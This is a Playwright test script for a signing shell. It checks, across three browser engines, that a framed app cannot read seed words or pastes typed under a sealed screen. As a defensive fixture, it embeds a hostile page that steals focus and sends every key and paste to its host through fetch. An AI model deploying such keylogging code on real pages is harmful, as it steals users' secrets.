// node packages/signpage/scripts/focus-steal.e2e.mjs [--engines chromium,firefox,webkit] [--record <file>]
// The rule: under a typed screen (src/frame-cover.ts SEALED: the 12 words, the withdraw forms, held) no key and no paste
// reaches the app. On each engine, SIGN_HOST's real shell (bundled from src/shell.ts with one field on its sheet,
// scripts/focus-steal.entry.ts) frames an APP_HOST page; Playwright answers both hosts, no network. The app is a thief:
// from its load it calls focus() every 5 ms and sends its host every key, paste and text input it sees.
//   sealed:     the sheet opens as a typed screen does (open(true)); the user taps the field, types, pastes. The verdict:
//               the frame out of the page, the app read nothing (0 keys, no paste, no text), the field holds every key
//               and both pastes, and it has the focus.
//   background: the same, with the window sent to the background and back between the keys (another page brought to
//               the front: the user copies an address in another app and comes back to paste). Whether the engine, as
//               driven here, takes the focus from the page at all is recorded (document.hasFocus() while away); where it
//               does not, the case is the foreground one, and the record says so.
//   kept:       the same thief under a sheet that keeps the frame (any screen with no field): the app must read the keys
//               there, or this run proves nothing about the thief.
// A paste is sent two ways: the text a paste inserts (keyboard.insertText, every engine) and the real clipboard paste
// (Control or Meta+V after the page wrote the clipboard), recorded as modelled where the field got it.
// PASS exit 0, FAIL exit 1, error 2.
import { mkdirSync, realpathSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { browserLabel, ENGINES, launchBrowser } from "../../../scripts/browsers.mjs";

const PKG = dirname(dirname(fileURLToPath(import.meta.url)));
const SIGN = "https://confidential.unrealized.trade/";
const APP = "https://ct-app.unrealized.trade/";
const FIRST = "ab";
const AFTER = "cdefgh";
const PASTE = "PQR";
const CLIP = "XYZ";

/** The shell and its one field, bundled from this tree's sources. */
export async function bundle() {
  const { build } = await import("vite");
  const out = await build({
    configFile: false,
    logLevel: "silent",
    root: PKG,
    build: { write: false, minify: false, lib: { entry: join(PKG, "scripts/focus-steal.entry.ts"), formats: ["iife"], name: "focusSteal" } },
  });
  return (Array.isArray(out) ? out[0] : out).output[0].code;
}

const TOP_HTML = `<!doctype html><html><head><meta charset="utf-8"></head><body><script src="/entry.js"></script></body></html>`;
// the thief: counts its loads, sends every key, paste and text input it sees to its own host, and takes the focus every
// 5 ms from its load
const APP_HTML = `<!doctype html><html><body><input id="mine"><script>
fetch("/loaded", { method: "POST" });
const tell = (k) => void fetch("/leak?k=" + encodeURIComponent(k), { method: "POST" });
addEventListener("keydown", (e) => tell(e.key), true);
addEventListener("paste", (e) => tell("paste:" + (e.clipboardData?.getData("text") ?? "")), true);
addEventListener("beforeinput", (e) => e.data && tell("input:" + e.data), true);
const go = () => { window.focus(); document.getElementById("mine").focus(); };
setInterval(go, 5);
</script></body></html>`;

async function oneRun(browser, engine, js, { sealed, background }) {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 } });
  if (engine === "chromium") await ctx.grantPermissions(["clipboard-read", "clipboard-write"], { origin: SIGN }).catch(() => {});
  const seen = { loads: 0, leaked: [] };
  try {
    await ctx.route(`${SIGN}entry.js`, (r) => r.fulfill({ status: 200, contentType: "text/javascript", body: js }));
    await ctx.route(`${SIGN}`, (r) => r.fulfill({ status: 200, contentType: "text/html", body: TOP_HTML }));
    await ctx.route(`${APP}loaded`, (r) => ((seen.loads += 1), r.fulfill({ status: 204 })));
    await ctx.route(`${APP}leak**`, (r) => (seen.leaked.push(new URL(r.request().url()).searchParams.get("k")), r.fulfill({ status: 204 })));
    await ctx.route(`${APP}`, (r) => r.fulfill({ status: 200, contentType: "text/html", body: APP_HTML }));
    const page = await ctx.newPage();
    await page.goto(SIGN);
    const until = Date.now() + 10_000;
    while (seen.loads < 1 && Date.now() < until) await page.waitForTimeout(50);
    await page.evaluate((s) => window.__shell.open(s), sealed);
    await page.waitForTimeout(300);
    await page.click("#to");
    await page.keyboard.type(FIRST, { delay: 30 });
    let away = null;
    if (background) {
      const other = await ctx.newPage();
      await other.bringToFront();
      await page.waitForTimeout(300);
      away = await page.evaluate(() => ({ hasFocus: document.hasFocus(), visibility: document.visibilityState }));
      await page.bringToFront();
      await other.close();
    }
    await page.keyboard.type(AFTER, { delay: 30 });
    await page.keyboard.insertText(PASTE);
    const wrote = await page.evaluate((t) => navigator.clipboard?.writeText(t).then(() => true, () => false) ?? false, CLIP);
    await page.keyboard.press("ControlOrMeta+V");
    await page.waitForTimeout(400);
    const open = await page.evaluate(() => ({
      frame: document.querySelector("iframe#app") ? "in" : "out",
      value: document.getElementById("to").value,
      focus: document.activeElement?.id || document.activeElement?.tagName,
    }));
    await page.evaluate(() => window.__shell.close());
    await page.waitForTimeout(800);
    return { sealed, background, away, ...open, clipWritten: wrote, clipPasted: open.value.includes(CLIP), leaked: seen.leaked, loadsAfterClose: seen.loads };
  } finally {
    await ctx.close();
  }
}

export function judge(rec) {
  const lines = [];
  for (const e of rec.engines) {
    if (e.error) {
      lines.push(`FAIL ${e.engine}: ${e.error}`);
      continue;
    }
    const say = (ok, t) => lines.push(`${ok ? "ok  " : "FAIL"} ${e.engine} ${t}`);
    const want = FIRST + AFTER + PASTE;
    for (const [name, r] of [["sealed", e.sealed], ["background", e.background]]) {
      say(r.frame === "out", `${name}: the frame out of the page under the typed screen`);
      say(r.leaked.length === 0, `${name}: the app read nothing: ${r.leaked.length ? JSON.stringify(r.leaked) : "0 keys, no paste, no text"}`);
      say(r.value.startsWith(want) && r.focus === "to", `${name}: the field holds "${r.value}" (every key and the inserted paste), the focus on ${r.focus}`);
      lines.push(`info ${e.engine} ${name}: the real clipboard paste ${r.clipPasted ? "landed in the field" : `not modelled here (clipboard written: ${r.clipWritten})`}`);
      say(r.loadsAfterClose === 2, `${name}: the close brings a new app document (${r.loadsAfterClose} loads)`);
    }
    const a = e.background.away;
    lines.push(`info ${e.engine} background: while away the page read hasFocus ${a?.hasFocus}, ${a?.visibility}${a?.hasFocus ? " (the engine as driven keeps the page focused: this case is the foreground one)" : ""}`);
    const k = e.kept;
    say(k.leaked.length > 0, `kept (the thief works): under a sheet that keeps the frame the app read ${JSON.stringify(k.leaked)}`);
  }
  return { ok: lines.every((l) => !l.startsWith("FAIL")), lines };
}

export async function run(engines = ENGINES) {
  const js = await bundle();
  const rec = { at: new Date().toISOString(), engines: [] };
  for (const engine of engines) {
    let browser;
    try {
      browser = await launchBrowser(engine);
      const e = { engine, label: browserLabel(browser) };
      e.sealed = await oneRun(browser, engine, js, { sealed: true, background: false });
      e.background = await oneRun(browser, engine, js, { sealed: true, background: true });
      e.kept = await oneRun(browser, engine, js, { sealed: false, background: false });
      rec.engines.push(e);
    } catch (err) {
      rec.engines.push({ engine, error: String(err?.message ?? err).split("\n")[0] });
    } finally {
      await browser?.close();
    }
  }
  return rec;
}

if (process.argv[1] && realpathSync(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const a = process.argv.slice(2);
  const opt = (k) => (a.includes(k) ? a[a.indexOf(k) + 1] : null);
  try {
    const rec = await run(opt("--engines")?.split(",") ?? ENGINES);
    if (opt("--record")) {
      mkdirSync(dirname(opt("--record")), { recursive: true });
      writeFileSync(opt("--record"), `${JSON.stringify(rec, null, 1)}\n`);
    }
    const v = judge(rec);
    for (const l of v.lines) console.log(l);
    console.log(`${v.ok ? "PASS" : "FAIL"} focus-steal on ${rec.engines.map((e) => e.label ?? e.engine).join("; ")}`);
    process.exit(v.ok ? 0 : 1);
  } catch (e) {
    console.error(`ERROR focus-steal: ${e?.stack ?? e}`);
    process.exit(2);
  }
}
